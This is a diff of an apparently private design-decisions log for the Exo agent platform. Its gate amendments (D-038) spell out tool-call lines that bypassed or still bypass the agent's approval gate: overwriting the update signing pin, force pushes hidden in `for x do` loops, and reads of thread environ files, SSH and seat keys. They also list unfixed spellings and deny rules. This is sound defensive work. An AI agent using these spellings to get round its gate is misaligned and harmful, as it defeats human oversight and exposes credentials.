@@ -1,7 +1,8 @@
 # DECISIONS
 
 Each significant choice: what, why, what was rejected. Newest last. A reads along and redirects.
-Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
+Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if. An entry still waiting for the principal's
+ruling carries Status, Why, Proposal, Rejected and Open instead, and takes Decision and Revisit if once it is ruled.
 
 ## D-001 (2026-10-11) Work lives in this repo; phases leave handoffs
 - **Decision:** All Exo planning and code lives in `aska-digital/exo` (private). Each phase ends with a
@@ -158,6 +159,16 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   a rewrite with no lifting (throws away Hermes's edge-case fixes and A's 2026 work).
 - **Revisit if:** the lean core misses its wave 1 exit test by more than two waves of effort, or Hermes
   splits out a small, dependency-free core library that Exo could depend on without inheriting the rest.
+- **Amendment 2026-10-21 (#264, W1-6):** exod's HTTP transport answers a bad number in a request with 400 and a
+  JSON `{"error": ...}` body. `Content-Length`, the `since` query value and `Last-Event-ID` must be ASCII digits
+  up to 2^63 - 1, SQLite's largest integer and so the durable event log's bound. Leading zeros are allowed. A
+  bare `int()` read them and the client handler swallowed its `ValueError`, so a word or a float in any of them
+  got no reply, and so did a negative length, which reached `readexactly`. A negative `since` replayed from the
+  start. A `since` past the bound sent the stream's 200 header, then failed in the replay and left its
+  subscription in the hub. A length over 8 MB is still 413 up to the bound, and a 400 past it. The
+  `events.subscribe` command keeps its typed `internal` reply for such a `since`: `GET /events` has no reply
+  envelope, so the bound is checked before the stream opens. A malformed request line still closes the
+  connection with no reply.
 
 ## D-011 (2026-10-12) Store v2: hafiz format absorbs Arif and Eldunari
 - **Decision:** adopt `docs/STORE-V2.md`. One format, three kinds of store: person (hafiz), agent (Eldunari
@@ -172,6 +183,13 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   local only until A rules on a private remote.
 - **Rejected:** keeping Arif in Postgres (cannot travel to a device); three separate stores per person
   (drift); remote embeddings (personal text leaves the machine).
+- **Amendment 2026-10-21 (#254):** until the FTS5 and embedding stages are built, retrieval is the in-memory BM25 of
+  `store.find`. It rebuilt its tables from every node on each call. It now keeps them with the node set they were
+  built from and builds them again when a reload makes a new set (a refresh that sees a change reloads). Holding the
+  set itself is the reload generation: a separate counter, read apart from the set, could pair an old set with a new
+  number when two threads share a store. Rejected: building the tables in `reload()`, which would tokenize stores that
+  are never searched. Also rejected: moving to FTS5 now, which is stage 3 of `docs/STORE-V2.md` and a larger change.
+  Scores and order are unchanged. Docs: `docs/CORE.md` "Find".
 
 ## D-012 (2026-10-12) One learning loop: review, taste and hill-climbing eval
 - **Decision:** adopt `research/LEARNING-LOOP.md` as `exo.learn`. One background reviewer that only
@@ -187,6 +205,12 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   auto-promote under rule 4. The principal reviews that first batch, as `docs/ARCHITECTURE.md` section 5 says.
   Imported evidence is dated by its source time, and superseded rows (an edited ChatGPT prompt's older
   versions, inactive Hermes rows) do not count for the rule of three.
+  *Amendment 2026-10-21 (issue #263):* the chat capture after each turn no longer reads the whole ledger to find the
+  capture keys already written. The learner keeps them, with the last row it read, and reads only the rows after it.
+  The result is the same as a full read of any ledger `exo log verify` passes: the ledger is append-only and nothing
+  takes a key back. A ledger that no longer holds that row in its place is read again from the first row. With 10,000
+  captured rows in the ledger, each turn's capture took about 70 ms. Now the first turn after a start takes that once,
+  and each later turn under 1 ms.
 - **Waiting on A (spend and model choice):** monthly ceiling for the nightly eval and climb; the judge
   model.
 - **Rejected:** Hermes-style direct edits by the reviewer (no check that a lesson helps); Command Code
@@ -477,6 +501,18 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   says. Its delegate children open with `memory_zoom(subagent=)` only from it or a fork of it. A fork's copies count
   at their original's log position, so a fork opens with its parent's tail. Details in docs/MEMORY-MODEL.md
   "Private threads".
+  *Amendment 2026-10-21 (#245, PR #405):* a copy counts at its original's log position only while the tree holds
+  that original. When the parent undid an entry after the fork, the tree dropped the original, and no tree held
+  the copy. Once the fork's own later entries were summarized, its tail started after the copy, so its calls lost
+  it. Now a fork that is not private keeps such copies in its tail, verbatim, in order, ahead of its own entries
+  (`SessionStore.orphaned_copies`). Only copies of logged entries are kept. A copied context note was never logged,
+  so it still leaves the tail as the tail moves on. This is the second option in #245. The first, a summary tree
+  per fork as a private thread has, was not taken: every public fork would run a second tree, with its own
+  summarizer calls and a turn that waits on it (D-068), for copies that exist only after an undo in the parent.
+  The cost of the second option: the kept copies sit outside `tail_messages` and `/compact`, so a fork whose
+  parent undid 20 turns carries all 20 in every call. In a fork of a fork the kept copies come after the middle
+  fork's own entries, which the tree holds. The lookup runs only on a fork (`fork_seq` set) and reads only its
+  copies, so a thread that is not a fork pays nothing.
 
 ## D-029 (2026-10-12) jevgrep as code_find; native port later if the measured win holds
 - **Why:** "where is X decided" questions cost an agent many grep and read rounds. dzhng/jevgrep (MIT, `jg`
@@ -704,6 +740,12 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   reading the stdin source file in the gate (the same folder problem, and a host read before a required worker).
   Limits: `docs/GATE.md` "What an approval covers".
 
+- **Amendment (2026-10-21, #397):** a merge commit's subject and body are posted text.
+  `gh pr merge --subject`/`--body` become the commit message in the repository, public on a public
+  repository, so the posting rules and the scrub see them when a merge carries them, as they have
+  seen a close's comment since #326. A merge carrying neither is unchanged. A reopen's comment is
+  posted text the same way: gh posts it on the thread.
+
 ## D-034 (2026-10-12) Providers setup: one engine, three surfaces, keys write-only
 - **Amendment 2026-10-19 (#271):** provider status rows replace URL userinfo with `***@`, including the rows
   printed by `exo models` and sent to `/providers` and the web. Invalid URLs produce a generic label without
@@ -782,6 +824,16 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   gains the name. Rejected: treating a marker with no name as Exo's, because that deletes copies made before this
   change. Rejected: comparing the folder with the checkout's plugin, because an older install of a plugin that has
   changed since differs from it as much as an edited copy does.
+  *Amendment 2026-10-21 (#260):* the subcommand parser imports a command's module only when that command runs.
+  `src/exo/cli.py` lists each command that lives in another module in a `LAZY` table, with its module, handler and
+  help line. `build_parser(cmd)` builds the full parser for `cmd` alone. Every other command keeps its name and
+  help line, so usage, errors and `exo --help` are byte-identical to the full parser, and a test compares the two
+  for every command. `exo --help`, `exo --version` and bare `exo` import no command module, and a module that fails
+  to import breaks only its own commands. The update self-check now builds the full parser, so it still imports
+  every command's module. Rejected: building the full parser for `exo --help`, because help would still pay for
+  every import. Rejected: a checked-in snapshot of the help text, because every help change would have to edit it
+  too. The cost is that each help line is written twice, in the module and in the table, and the test fails when
+  they differ.
 
 ## D-036 (2026-10-12) `exo` and `exo web` in any order share one core
 - **Why:** a live bug. `exo web` connected to `run/exod.sock`, found no `exo serve`, and the chat page showed
@@ -923,6 +975,40 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   Not done: a write back through a link to a descriptor path, `/dev` or `/proc/self` made out of the gate's sight,
   after an open on descriptor 3 or above the gate cannot read; a hardlink to a store file opened on stdout; and a
   walk over a folder above the run folder.
+  *Amendment 2026-10-21 (issue #133):* `$EXO_HOME/update` joins the protected list. It holds `allowed_signers`, the
+  signed-update trust pin of D-073: with `update.require_signed` on, `exo update` installs the upstream tip only when
+  it verifies against that file. A tool could rewrite it with no ask (`cp /tmp/evil ~/.exo/update/allowed_signers`
+  was an allowed `shell`, a `write_file` there an allowed `local_write`), and the principal's next approved
+  `exo update` would then install code signed by the tool's own key. Now a write to the folder or anything in it is
+  `store_write` in every form the store checks read: `~`, `$HOME`, `$EXO_HOME` or a full path, a brace set, a
+  relative name after a `cd`, a file tool, and a removal, move, link or mode change of the folder. `.exo/update`
+  counts whatever `EXO_HOME` is, and `update/allowed_signers` is a distinctive name, as `state/gate-grants.json` is,
+  so a relative write to it counts under the shell tool's own `cwd` argument too, which the store checks do not
+  read. `exo update --pin-trust` is `store_write` as well. Its old `opaque_exec` reading stays a part, so a policy
+  that denied it still does, and one that names `opaque_exec` at `allow` or `log` now asks. Reads stay `read`. A
+  project folder called `update`, `$EXO_HOME/updates` and `$EXO_HOME/update.json` keep their class. A project file
+  at `update/allowed_signers` asks. The pin lives in `$EXO_HOME` only, so the principal stores get no `update`
+  entry. This closes the gap the D-073 amendment of 2026-10-17 named for the pin. `config.json` stays an ordinary
+  local write until D-074 (#125). The gate differential against main (#423), with a corpus of these forms added,
+  lowered 37 pairs on 15 actions in the original corpus. The expanded review corpus found a third kind below.
+  In each kind the pin now decides as `state/` and `bus/` files already
+  decide on main, and the line still asks the principal alone, with no grant. (1) A file tool's write or delete
+  on the pin or the folder (any file tool, such as `write_file`, `edit_file`, `patch`, `apply_patch`,
+  `create_directory`, `move_file` or `delete_file`) was
+  `local_write` or `delete` and is now `store_write` alone, so `deny: [local_write]` or `deny: [delete]`, a
+  `categories:` deny or a rule on those categories no longer denies it, and a `reserved: [delete]` entry no longer
+  marks it (31 pairs on 9 actions). A shell write keeps its `local_write`, `shell` or `delete` part beside the store
+  part, so its category deny holds (D-075). (2) After `cd /dev`, a line that names a store path (`printf x > update/allowed_signers`,
+  or a path through `.exo/update`) takes that name as its target where it took `/dev`, so a `target:/dev*` deny no
+  longer matches it (6 pairs on 6 actions). This also covers credentials commands naming the pin.
+  (3) The matrix reads the dominant part only. A remote delete such as `ssh host 'rm -rf ~/.exo/update'`
+  changes from a matrix deny on delete to the principal-only store-write ask, as deleting `~/.exo/state`
+  already does. Category denies still read the retained delete part. Chosen over keeping a file tool's old category as a part, which would
+  change the decisions for every store path, not only the pin's. That is a follow-up for the whole store. Not done,
+  as for the other store folders (`docs/GATE.md` "Known limits"): a glob or hard-link spelling, a copy or archive
+  unpacked into the home folder that makes `update/` from its source name (`cp -r /tmp/x/update ~/.exo/`,
+  `tar -C ~/.exo -xf x.tar`), a relative name other than `update/allowed_signers` under the shell tool's `cwd`
+  argument, and a path held in a variable or made by a command (`F=~/.exo/update/allowed_signers; cp x "$F"`).
 - **Decision, policy reload:** pin the policy at first load. A changed file is loaded and logged (`policy_change`
   row with file hashes) and each call is decided under both; the stricter wins. Loosening takes effect only after
   `/gate accept` or a restart. Chosen because it is simple and sound: a tool cannot loosen policy by any write path,
@@ -1215,7 +1301,8 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   operators of `HOME`, `EXO_HOME`, `CLAUDE_CONFIG_DIR` and `EXO_PRINCIPAL_STORE` are read with the value and with the
   default; both count. A shell word with a `$( )`, a backtick pair or an unknown variable is also matched with each
   one empty, and with each one between two literal parts read as `*`. A glob is read in bash's bracket syntax
-  (`[^x]`, POSIX classes), and `/proc/<pid>/<glob>` is matched against `environ`. Rejected: treating every
+  (`[^x]`, POSIX classes), and `/proc/<pid>/<glob>` is matched against `environ` (a thread's
+  `/proc/<pid>/task/<tid>/<glob>` too since the #313 amendment below, 2026-10-21). Rejected: treating every
   expansion inside a word as opaque, which would ask on `cat notes-$(date +%F).md`; refusing links in `read_file`
   alone, which leaves the shell open. The checks of one classify call share their file-system lookups, which made a
   10 KB line several times faster. Limits in `docs/GATE.md` "Other spellings of a store path".
@@ -1264,6 +1351,78 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   once), which would put a `$( )` five levels down past the four-level cap and turn its deny into an ask. Also
   rejected: a scan that follows only quotes and parentheses to the end of the nest, which a quote in a comment or a
   here-doc body leads past the end, past a deny-listed command.
+  *Amendment 2026-10-22 (issue #436):* bash and POSIX take `do` as the reserved word right after the name in
+  `for NAME do` and `select NAME do`, with no `in` list and no `;` or newline before it, and run the loop over the
+  positional parameters. The parser opened a loop body only after a `;` or a newline, so it read that `do` and the
+  whole body as words of the `for` command, whose header names no program. So
+  `for x do git push --force origin main; done` was a `read`, allowed under every policy, `deny: [force_push]`
+  included, and so was a delete, a post or a store write in the body (`select` asked as `opaque_exec`). Now an
+  unquoted `do` right after the word that follows a `for` or `select` the parser reads as a reserved word ends the
+  loop's first command, as a `;` would. The line then reads as `for NAME; do ...` does wherever a line is parsed
+  (`$( )`, backticks, `bash -c`, `eval`, a compound, a function body). The parser takes `for` or `select` as that
+  reserved word also after `function NAME` or `coproc [NAME]` and a reserved word such as `{`, and behind reserved
+  words such as `then` (`function f { for x do ...; done; }`). Only this check reads command position that widely:
+  the compounds the parser follows for a heredoc or a pipe into them are found as before (#161). A quoted `"do"`, a
+  `do` in an `in` list and a `for` that is only an argument (`echo for x do`) stay words, as in bash. An arithmetic
+  loop (`for ((...)) do`) was read already. The gate differential (#423) lowers 9 pairs on one action of its corpus
+  (24,937 actions x 76 policies). On 84,601 loops built from the corpus's simple commands (in a `for` or `select`
+  body, a function or coproc body, `$( )`, `bash -c`, a `while` loop that ends in `break`, and beside a loop) it
+  lowers 21,293 pairs on 1,233 actions. Each lowered pair now gets the decision main gives the same loop written with
+  `;`, checked pair by pair (category, outcome, rule and reserved entries). Main read these lines as one command, and
+  that reading asked for a reason bash never meets. There are three groups.
+  An unknown command after the loop, such as `break` in
+  `while true; do for x do git push --force origin main; done; break; done`, was the one program main saw there, so
+  the line asked as `opaque_exec`. Under a policy that allows or logs the body's category (an allow-everything rule,
+  `categories: {delete: allow}`), the line now gets the body's outcome (19,565 pairs on 1,029 actions, and the 9
+  pairs of the corpus).
+  A store path read in a `select` body, or in a loop body after `function NAME` (with or without `{`) or `coproc`
+  (`select x do cat ~/.exo/keys/seat.key; done`), was an operand of an unknown program, so a `store_write`. It is
+  now the `opaque_exec` of the `select` or the definition beside a plain read or a `credentials` read. A policy that
+  allows `opaque_exec` allows it, `deny: [store_write]` or a `target:` deny on the store asks, and a `reserved:`
+  entry on `store_write` no longer names it (1,624 pairs on 168 actions).
+  A `sudo` or `doas` command that writes through a redirection in a loop body (`for x do sudo echo hi > /tmp/f; done`) took the
+  redirection's `local_write` and now takes the `read` main gives that command alone, so an ask or log line on
+  `local_write` no longer reaches it (104 pairs on 36 actions in the original corpus). The review's expanded
+  corpus also found 66 `doas` pairs on 22 actions. `deny: [local_write]` still denies it (D-075).
+  Left out: `time for NAME do ...`, since the parser does not read `for` after `time` as a reserved word. It asks as
+  `opaque_exec`, as `time { ...; }` does.
+  *Amendment 2026-10-21 (issue #313, follow-up to #199):* on Linux each thread's `/proc/<pid>/task/<tid>/environ`
+  holds the same environment as `/proc/<pid>/environ`, another process's included. The store list named only the
+  direct form, so `cat /proc/self/task/1/environ` and `read_file` on it were plain reads. The store list now names
+  the `task/<tid>/` form too. The #199 glob check reads `/proc/<pid>/<x>/<tid>/<glob>` as a thread's file when `<x>`
+  could match `task` and the glob could match `environ`, so `cat /proc/1/*/*/environ` and
+  `cat /proc/self/[t]ask/*/environ` ask. Other files under `task/` keep their class (`cat /proc/self/task/*/status`).
+  The search tools leave a thread's `environ` out of a walk, as they leave out the direct form (#241).
+  *Lowered lines.* A thread's environment is decided as `/proc/<pid>/environ` already was, so some lines decide
+  lower than before. A differential of main against the change ran 27,708 actions under 95 policies: the
+  differential's own set, plus task-environ lines, compound lines and file-tool calls, and 19 more policies (a
+  `read` deny, `reserved: [read]`, `/proc` targets, more matrix cells). It found 2,877 lowered pairs on 1,364
+  actions. Each one decides as main decides the same action with `/proc/self/environ`. Four groups, all from how
+  the gate already handles any secret store: (1) A file tool on a store takes the `credentials` class in place of
+  its own, so a deny on `read` or `local_write` (a category line, a `deny:` entry, a rule, a matrix cell) becomes
+  the credentials ask (`read_file /proc/self/task/1/environ` under `categories: {read: deny}`). A `reserved: [read]`
+  entry no longer matches the call. It still asks, and no grant covers it, since it is `credentials`. A shell line
+  keeps the read as a part (D-075), so a `read` deny still denies `cat`. (2) The matrix sees the dominant part only.
+  A credentials line is costly and private and takes the strongest reversibility of its parts, so a deny cell for a
+  read, or for another part of a compound line, no longer applies
+  (`cat /proc/self/task/1/environ; git push --force origin main` under an `irreversible`, `internal` deny cell
+  asks). (3) Before #396 the posting rules checked the dominant part, so a post beside the read lost its listed
+  violations. They now read every post (D-075 amendment, #396), so it keeps them, named after its part. The
+  line asks either way. (4) A line's credentials target is the first store it names and a `cat` part has no target, so a
+  `target:` entry for a second store on the line no longer matches
+  (`cat /proc/self/task/1/environ; cat ~/.ssh/id_rsa` under `deny: [target:*/.ssh/*]` asks, as
+  `cat ~/.aws/credentials; cat ~/.ssh/id_rsa` already does). The differential does not count a fifth change,
+  because the outcome stays an ask. (5) Beside a store write the line is `credentials`, not `store_write`. A seat
+  that `approvals.yaml` delegates `credentials` to may then answer what only the principal answered
+  (`cat /proc/self/task/1/environ; echo x > ~/.exo/policies/gates.yaml`). Main does the same for any secret on
+  the line (`env; echo x > ~/.exo/policies/gates.yaml`). Rejected: keeping a file tool's own class as a part,
+  as D-075 does for shell lines. It would keep group 1 denied, but it changes every file-tool call on a store
+  (`read_file ~/.ssh/id_rsa` under `categories: {read: deny}` asks on main), so it is a follow-up, as are matrix
+  cells, posting checks and `target:` entries on every part, and a store write that keeps the principal's answer
+  beside a secret. Limits: a doubled slash or a `..` inside a store name is matched as written, so
+  `cat /proc/1/task/1//environ` and `read_file /proc/1/task/1//environ` stay reads, as `cat ~/.kube//config` does
+  on main. A glob in the `/proc` name itself is not read, for either form (`cat /pro?/self/task/1/environ`,
+  `cat /pro?/self/environ`).
 
 ## D-039 (2026-10-12) Approval identity from the connection; web token on every route; one secret scrub
 - **Why:** the 2026-10-12 audit. (a) `approval.respond` took the answerer from its body: an empty `client` meant
@@ -1434,6 +1593,12 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   it changes), frames it as a bus message with author `bus:<seat>`, and runs the peer policy: `remote` is held by
   default. The channel posts a reply only for a turn that an auto-delivered message started. The relay signs with its
   own key only on a post it marks `{"relay": {"composed_for": seat}}`, and readers never count that as the seat.
+  *Amendment 2026-10-22 (#455):* the relay validates numeric HTTP query parameters before SQLite sees them.
+  Message and inbox `since` and verification `to` range from 0 to 2^63 - 1; verification `from` starts at 1.
+  Message and inbox page limits range from 1 to 1,000. Invalid values answer 422 through FastAPI's query
+  validation, as malformed integers already did. This prevents SQLite overflow errors from answering 500 and
+  negative limits from lifting the page cap. Rejected: clamping invalid values, which silently changes the
+  requested range, or catching database overflow after dispatch, which leaves negative limits unbounded.
 - **Keys:** `$EXO_HOME/keys/registry.json` (0600) pins local signing keys (on creation in `keys/`), bus seat keys,
   and principal ids. `exo log verify` and `exo memory verify` pass it as `trusted`: an unpinned key fails, and so
   does a seat signing as another pinned name. `exo keys` lists and pins.
@@ -1478,6 +1643,15 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   the session id: a compression child session inherits its parent's pins, and a reset-only switch rebinds
   through `bind_session_state`, a branch child inheriting its parent's pins. With those, everything a pinned
   block held survives compaction by the pins instead, across session moves too.
+  *Amendment 2026-10-21 (#398):* the survival sentence above holds only where the session's pins were
+  observed. A session last compacted before pins were observed at compaction (any 0.2.0 Hermes session:
+  0.2.0's `compress` never observed pins) holds its rulings, corrections and open decisions only in the
+  summary's block, and all three drop at its first compaction after the upgrade. The handoff written at
+  that earlier compaction still has them, and `/exo resume` reads it back; a 0.2.0 handoff may quote a
+  forged block, so it is a record to read, not the principal's words. Open-decision pins are also capped
+  at the newest 12, in `_observe` and in `_carry_pins`: a deferral never expires on its own, and the
+  uncapped list grew the pins file and the per-turn scan over it for the life of the session. The cap is
+  the one the compaction block and the handoff already applied to the merged list.
   *Amendment 2026-10-20 (#322 item 4, #381):* `defuse_pins` also escapes the tag spelled in characters a
   downstream step may fold back to ASCII. That is unicode tag characters (U+E0020-E007E), which a reader may
   decode to the ASCII they mirror or drop, and every character whose NFKC form is one ASCII character. Full-width
@@ -1663,6 +1837,14 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
 - **Contested questions:** answered by ruling 4 (above): reasoning style only.
 
 ## D-045 (2026-10-12) Approval cards never outlive their request; the web stream resumes; a queued steer can be pulled back
+- **Amendment 2026-10-20 (#361):** terminal steer lines explicitly show sending, queued and delivered. A send reply
+  alone never proves delivery: the matching user `message.completed` does, including when it arrives before the
+  reply; the existing successful `unsteer` acknowledgement can also confirm it already left the queue. Such early
+  event receipts are held only while sends are in flight. A lost reply shows delivery unknown; a refused
+  send shows not sent. The activity line leads with the queued count while a draft is typed. Approval cards lead
+  with `Ctrl+F, then [o] once [a, Enter] always [d, Enter] deny`, before request details. Ctrl+F still deliberately
+  focuses the card, preserves the draft and keeps the existing answer confirmation. No binding or authority changes.
+  Send and unsteer replies received after a thread switch never update the new thread's draft or queued count.
 - **Amendment 2026-10-19 (#276):** the terminal serializes approval-card removal with thread switching and restoration,
   and waits for removal before mounting the next card under the same widget id. A close or answer names its request,
   so a stale event cannot remove its replacement. Threadless requests still survive thread switches. The response
@@ -1747,6 +1929,32 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   versioned deploy also needs a clean `site/`. An empty `EXO_VERCEL_CLI` exits 2 rather than falling back to the pin.
   There is no override. Symlinks inside `site/` stay allowed: `rsync -a` copies them as links, not their targets.
 - **Docs:** `docs/DEVELOPER-GUIDE.md` "Deploying the site".
+
+## D-048 (2026-10-12) Exopet: Exo as a living lattice
+- **Status:** Proposed 2026-10-12, revised 2026-10-13 (the community egg moved to D-058) and 2026-10-18 after review.
+  Design in docs/EXOPET.md, options and recommendation first. Nothing built. Independent of D-057.
+- **Why (principal, 2026-10-12):** bring the earlier pet experiments (EvoPet, TamaHermes) into Exo in its own look and
+  make them more: the first evolution unlocks only when the community together has earned enough XP, then Exo
+  hatches from its digital egg; later users get personal evolution; a pet gallery; a skill to make a pet from the
+  user's direction with animations mapped to activity; the egg and forms grow out of the incentre lattice, "an alive
+  evolving pulsing matrix of information".
+- **Proposal:** the pet is Exo, drawn as the incentre lattice. Ten forms on EvoPet's 99-level ladder: egg, cell, tile,
+  cube, frame, then one per dimension from 4 to 8, drawn with the brand egg's stages where a client uses the egg
+  (docs/EXOPET.md section 1 has the mapping to D-049). XP is a versioned pure function of the verified ledger
+  (principal-authored, pinned keys, anchored), weighted toward teaching (verdicts, rulings, promoted lessons) over
+  volume, with a daily curve capped at 1,000 and one form per day. No care stats, needs, decay or notifications. The
+  first evolution waits for the community egg, x0 (D-058). Learned items light cold-blue dots, house taste shows grey
+  (D-044). No new protocol event: the state comes from existing events, status from a `pet` built-in. A data-only
+  `exopet.json` format, a gallery run as an index repository with CI and signed packages, and an `exopet-create`
+  skill.
+- **Depends on:** D-056 (Accepted) takes its codenames from this form line (egg, cell, tile, cube, frame). A ruling
+  against the form names leaves those codenames without a source.
+- **Rejected:** XP per token (rewards long, wasteful turns); a stored XP number (editable); care stats and hibernation
+  (guilt and nags in a work tool); a face (off the instrument look); a new protocol event (29 of 30 used); pets as code
+  (a gallery would run strangers' code); a server that sees ledgers (breaks local-first); install reports, a counter
+  service and receipts for the community hatch (removed by D-058).
+- **Open:** seven questions for the principal at the end of docs/EXOPET.md (hatch target, a slow community, x0 after the
+  hatch, the core cap, agent work, default on or off, the founders' ring), each with a recommended pick.
 
 ## D-049 (2026-10-12) Brand: the lattice egg and the X/V mark
 - **Status:** Accepted 2026-10-13 (the principal: "a work of beauty"). Proposed 2026-10-12, previewed on staging
@@ -1891,6 +2099,114 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
 - **Validation:** tests check the `--version` form and that the changelog's latest release equals the pyproject version.
 - **Docs:** `docs/VERSIONING.md`, `CHANGELOG.md`, `docs/DEVELOPER-GUIDE.md`.
 
+## D-057 (2026-10-13) Event-driven activation: triggers, masked connectors, a runs dashboard, root causes
+- **Status:** Proposed 2026-10-13, revised 2026-10-18 after the reviews. Design in docs/EVENT-ACTIVATION.md, options and
+  recommendation first. Nothing built. Independent of D-048, D-058 and D-059.
+- **Amends:** D-052. Job edits (`schedule.edit`, every action but `list`) join the operations that need a live principal
+  caller. D-052 left jobs off that list and let local automation drive turns, so a local script can edit jobs today.
+- **Why (principal, 2026-10-13):** Railtown AI's platform (railtown.ai: build, feed, observe the agent) gave the idea
+  of agents started by events, not only by a person or a timer. Credited as the inspiration; none of its names are used.
+- **Proposal:** a trigger is a scheduled job with `on` (an event source) instead of `when`, managed by `schedule.edit`:
+  five new fields (`on`, `connector`, `limits`, `tools`, `roots`), no new protocol command or event. Stage 0 first,
+  five fixes that repair gaps on main and stand alone: only the principal changes jobs (`schedule.edit` has no
+  principal check today), a run can call only the tools it was given (a scheduled run is shown a shorter list but runs
+  any registered tool by name), notes and learning read who wrote a line (scheduled-run text reaches other threads as
+  `user:`), file search skips secret stores (`grep` and `glob` over the home folder return credential files with no
+  question today), and one search cannot freeze the core (a backtracking pattern stops the event loop, and nothing
+  limits a run's time). Then trigger runs that can only read: `read_file`, `glob` and `grep`, limited to the folders
+  the trigger names, in a thread of their own (kind `triggered`, not in the agent log, no memory provider), author
+  `trigger:<id>`, the envelope inside a D-040 tag, started through D-026's ingress path and under the gate, with the
+  answer going to the principal's notices only (channel delivery comes with a reply tool in a later stage). Webhook
+  first (signed, timestamped, replay-checked by signature, delivery id and body hash, secret under the credentials
+  floor), then folder and git, then connectors, masking and mail. Masking is a reduction for the envelope text and
+  nothing rests on it: placeholders never resolve, and a body read by reference arrives raw. Limits: debounce, minimum
+  gap, runs per hour and day, tool rounds, wall clock per run, tokens per run, per trigger and for all triggers, and
+  USD only where `models.spend` is set. A reached cap, a cap of 0 or an unreadable meter pauses the trigger. A runs
+  dashboard (`runs` built-in). Root-cause notes are off by default, filed as source `rca`, and leave the digest only
+  after the principal promotes one. A trigger that must write, run commands or reach the network is a later ruling that
+  needs an untrusted-input mode of the gate and a loop guard first. An Exo SDK for third-party agents is on the roadmap
+  only.
+- **Rejected:** a hosted event relay (breaks D-050); installing git hooks in the user's repositories (watching refs is
+  enough and changes nothing); letting the agent add its own triggers (it could widen its own reach); the scheduled-run
+  tool list under the ordinary gate (a plain `curl` GET with data in the URL passes the gate with no question, so text
+  from a stranger could send data out); resolving placeholders in tool arguments (a placeholder in a URL or a file
+  leaves with no card); tying spend caps to `budget.yaml` `per_day_max` (it governs priced tool actions only, never
+  model calls); channel delivery of a stage-1 answer (the post is not a tool call, so the gate never sees it); bounding
+  a search by refusing nested quantifiers (a filter that misses shapes such as `(a|a)+$`, not a bound).
+- **Open:** how events enter (D-026's ingress path, recommended, or a separate path), what a trigger run may do (read
+  only, in the folders it names, recommended), which source first (the webhook, recommended), root-cause default (off,
+  recommended), default limits, who may add a trigger (only the principal, recommended).
+- **Depends on:** stage 0 (nothing in it exists on main), and for the ingress door a `Target` and a `trigger` branch in
+  `frame()` in `src/exo/core/ingress.py`.
+
+## D-058 (2026-10-13) Exopet: the community egg, x0, grows from repository activity
+- **Status:** Proposed 2026-10-13, revised the same day (instant and validated XP, the name x0, meditation) and
+  2026-10-18 after review. Revises D-048 (Proposed). Design in docs/EXOPET.md section 3, options and recommendation
+  first. Nothing built. Independent of D-057.
+- **Why (principal, 2026-10-13, verbatim):** "users personal exos can gain xp from and level up from their own usage.
+  however the community one, and the one that initially gates all users exo evolutions, should be pased on repo
+  activity ... xp scales with significance of event of repo." Revision: "a small part of the learning is instant ...
+  then whenever we start reviewing community contributions the exo, which we will start calling x0 ... will go into
+  "meditating" mode ... and during that process it gains addional xp for each contribution that was validated."
+- **Proposal:** personal XP is unchanged. The community egg is named x0 (read "x-o"); a person's own copy stays "your
+  Exo". Each repository event adds a small instant share at once: issue 1, pull request opened 1, review 1, merge 2,
+  release 25 (a tag `exo-vX.Y.Z` pushed by a core account, at most one a week, validated by the act). The large share
+  is validated XP, granted when x0 meditates (a batch review a maintainer starts with a signed call): an issue fixed by
+  a merged pull request ("Fixes #N") 4 XP, a pull request merged or salvaged (`Salvaged-from: #N` in the landing pull
+  request) 10 XP, and a review that ion, the org's review bot, marks meaningful with a `rocket` reaction from its own
+  account 4 XP. ion is a dedicated machine account, a user and not a GitHub App. Target 2^11 = 2,048. Instant XP is
+  capped per account (3 a day), has global caps (15 an hour, 60 a day), fills at most 25 percent of the target, is
+  awarded once for each item and action and is never taken back. There is no account-age rule: a webhook carries no creation date and the caps bound new accounts. A
+  post-merge edit counts only from a core sender. The core team, founders and their agents count up to 40 XP a day and
+  25 percent of the target, instant and validated together, a cap rather than a discount. Agent issues, pull requests
+  and reviews earn nothing until a pull request is merged, and an App on the organization's agent list counts as an
+  agent, not as a bot. At least half of x0 comes from validated work and releases. Simulated hatch with a weekly
+  meditation: about 2 weeks after going public when busy, 6 weeks when steady, 5 months when quiet (14, 49 and 224
+  days if tags did not count).
+- **Removes from D-048:** install reports, the counter service, counter keys, proof of work and Merkle receipts. No
+  install sends anything about itself. Clients read the public feed (D-059) at most once a day, and the host sees that
+  request (docs/EXOPET.md section 4).
+- **Rejected:** a discount multiplier on the core (it still scales with agent volume); counting agent issues and pull
+  requests (cheap to make in bulk); counting stars, comments outside reviews or pushes (cheap, or already in merges);
+  a settle window that held all XP back for 7 days (a contributor saw nothing land); taking instant XP back on a void
+  (the fill would jump backwards; small caps bound it instead); trusting the reaction from any account or by login; an
+  account-age or blocked-author rule (the hook holds no token to look either up); counting a post-merge edit by the
+  pull request's own author (42 XP per merge, outside the caps).
+- **Open:** seven parameter questions at the end of docs/EXOPET.md, each with a recommended pick.
+
+## D-059 (2026-10-13) The live egg: x0 on the site reacts to repository events and meditates
+- **Status:** Proposed 2026-10-13, revised the same day (instant events, meditation, feed `v: 2`) and 2026-10-18 after
+  review. Design in docs/LIVE-EGG.md, options and recommendation first, then the interface. Nothing built. Independent
+  of D-057. Depends on D-058 for the rules the feed applies.
